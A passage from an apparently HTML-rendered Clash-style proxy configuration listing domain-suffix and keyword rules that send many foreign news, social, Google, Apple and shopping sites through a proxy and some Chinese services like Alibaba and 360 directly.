DOMAIN-SUFFIX,goodreads.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gov,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gov.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,greatfire.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gumroad.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hbg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,heroku.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hightail.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hk01.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hkbf.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hkbookcity.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hkej.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hket.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hkgolden.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hootsuite.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hudson.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hyread.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ibtimes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,i-cable.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,icij.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,icoco.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,imgur.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,initiummall.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,insecam.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ipfs.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,issuu.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,istockphoto.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,japantimes.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jiji.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jinx.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jkforum.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,joinmastodon.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,justmysocks.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,justpaste.it,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kakao.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kakaocorp.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kik.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kobo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kobobooks.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,kodingen.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,lemonde.fr,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,lepoint.fr,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,lihkg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,listennotes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,livestream.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,logmein.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mail.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mailchimp.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,marc.info,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,matters.news,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,maying.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,medium.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mega.nz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mil,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mingpao.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mobile01.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,myspace.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,myspacecdn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nanyang.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,naver.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,neowin.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,newstapa.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nexitally.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nhk.or.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nicovideo.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nii.ac.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nikkei.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nofile.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,now.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nrk.no,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nyt.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytchina.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytcn.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytco.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytimes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytimg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytlog.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nytstyle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ok.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,okex.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,on.cc,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,orientaldaily.com.my,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,overcast.fm,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,paltalk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pao-pao.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,parsevideo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pbxes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pcdvd.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pchome.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pcloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,picacomic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pinimg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pixiv.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,player.fm,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,plurk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,po18.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,potato.im,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,potatso.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,prism-break.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,proxifier.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pt.im,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pts.org.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pubu.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pubu.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,pureapk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,quora.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,quoracdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,rakuten.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,readingtimes.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,readmoo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,redbubble.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,reddit.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,redditmedia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,redditstatic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,resilio.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,reuters.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,reutersmedia.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,rfi.fr,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,rixcloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,roadshow.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,scmp.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,scribd.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,seatguru.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,shadowsocks.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,shopee.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,slideshare.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,softfamous.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,soundcloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ssrcloud.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,startpage.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,steamcommunity.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,steemit.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,steemitwallet.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,t66y.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tapatalk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,teco-hk.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,teco-mo.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,teddysun.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,textnow.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,theguardian.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,theinitium.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,thetvdb.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tineye.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,torproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tumblr.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,turbobit.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tutanota.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tvboxnow.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,udn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,unseen.is,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,upmedia.mg,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uptodown.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,urbandictionary.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ustream.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uwants.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,v2ray.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,viber.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,videopress.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vimeo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voachinese.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voanews.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,voxer.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vzw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,w3schools.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,washingtonpost.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wattpad.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whoer.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikimapia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikimedia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikipedia.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikiquote.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikiwand.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,winudf.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wire.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wordpress.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,workflow.is,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,worldcat.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wsj.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wsj.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xhamster.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xn--90wwvt03e.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xn--i2ru8q2qg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xnxx.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xvideos.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yahoo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yandex.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ycombinator.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yesasia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yes-news.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yomiuri.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,you-get.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zaobao.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zb.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zello.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zeronet.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zoom.us,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,github,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,jav,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,pinterest,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,porn,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,wikileaks,PROXY</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(Region-Restricted Access Denied)</span></span><br><span class="line">- DOMAIN-SUFFIX,apartmentratings.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apartments.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bankmobilevibe.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bing.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,booktopia.com.au,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cccat.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,centauro.com.br,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,clearsurance.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,costco.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,crackle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,depositphotos.cn,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dish.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dmm.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dmm.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dnvod.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,esurance.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,extmatrix.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fastpic.ru,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flipboard.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fnac.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fnac.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,funkyimg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fxnetworks.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gettyimages.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,go.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,here.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jcpenney.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,jiehua.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,mailfence.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nationwide.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nbc.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nexon.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstrom.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstromimage.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nordstromrack.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,superpages.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,target.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,thinkgeek.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tracfone.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,unity3d.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,uploader.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vevo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,viu.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vsco.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xfinity.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,zattoo.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Roam*,PROXY</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(The Most Popular Sites)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Apple</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; TestFlight</span></span><br><span class="line">- DOMAIN,testflight.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Apple URL Shortener</span></span><br><span class="line">- DOMAIN-SUFFIX,appsto.re,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; iBooks Store download</span></span><br><span class="line">- DOMAIN,books.itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; iTunes Store Moveis Trailers</span></span><br><span class="line">- DOMAIN,hls.itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; App Store Preview</span></span><br><span class="line">- DOMAIN,apps.apple.com,PROXY</span><br><span class="line">- DOMAIN,itunes.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Spotlight</span></span><br><span class="line">- DOMAIN,api-glb-sea.smoot.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Dictionary</span></span><br><span class="line">- DOMAIN,lookup-api.apple.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Google</span></span><br><span class="line">- DOMAIN-SUFFIX,abc.xyz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,android.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,androidify.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dialogflow.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,autodraw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,capitalg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,certificate-transparency.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chrome.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromeexperiments.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromestatus.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,chromium.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,creativelab5.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,debug.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,deepmind.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,firebaseio.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,getmdl.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ggpht.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gmail.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gmodules.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,godoc.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,golang.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gstatic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gwtproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,itasoftware.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,madewithcode.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,material.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,polymer-project.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,admin.recaptcha.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,recaptcha.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,shattered.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,synergyse.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telephony.goog,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tensorflow.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tfhub.dev,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tiltbrush.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,waveprotocol.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,waymo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,webmproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,webrtc.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whatbrowser.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,widevine.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,x.company,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,youtu.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yt.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ytimg.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Microsoft</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt;&gt; Microsoft OneDrive</span></span><br><span class="line">- DOMAIN-SUFFIX,1drv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,1drv.ms,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blob.core.windows.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,livefilestore.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,onedrive.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,storage.live.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,storage.msn.com,PROXY</span><br><span class="line">- DOMAIN,oneclient.sfx.ms,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Other</span></span><br><span class="line">- DOMAIN-SUFFIX,0rz.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,4bluestones.biz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,9bis.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,allconnected.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,aol.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bcc.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bit.ly,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bitshare.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blog.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blogimg.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blogtd.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,broadcast.co.nz,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,camfrog.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cfos.de,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,citypopulation.de,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cloudfront.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ctitv.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cuhk.edu.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cusu.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discord.gg,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discuss.com.hk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dropboxapi.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,duolingo.cn,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,edditstatic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flickriver.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,focustaiwan.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,free.fr,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gigacircle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hk-pub.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hosting.co.uk,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hwcdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ifixit.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iphone4hongkong.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iphonetaiwan.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,iptvbin.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,linksalpha.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,manyvids.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,myactimes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,newsblur.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,now.im,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,nowe.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,redditlist.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,s3.amazonaws.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,signal.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,smartmailcloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,sparknotes.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,streetvoice.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,supertop.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tv.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,typepad.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,udnbkk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,urbanairship.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whispersystems.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wikia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,wolframalpha.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,x-art.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,yimg.com,PROXY</span><br><span class="line">- DOMAIN,api.steampowered.com,PROXY</span><br><span class="line">- DOMAIN,store.steampowered.com,PROXY</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">China Area Network</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 360</span></span><br><span class="line">- DOMAIN-SUFFIX,qhres.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qhimg.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Akamai</span></span><br><span class="line">- DOMAIN-SUFFIX,akadns.net,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamai.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaiedge.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaihd.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaistream.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,akamaized.net,DIRECT</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Alibaba</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,%E4%BC%98%E9%85%B7*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,alibaba.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alicdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alikunlun.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,alipay.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,amap.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,autonavi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dingtalk.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mxhichina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,soku.com,DIRECT</span><br><span class="line">- 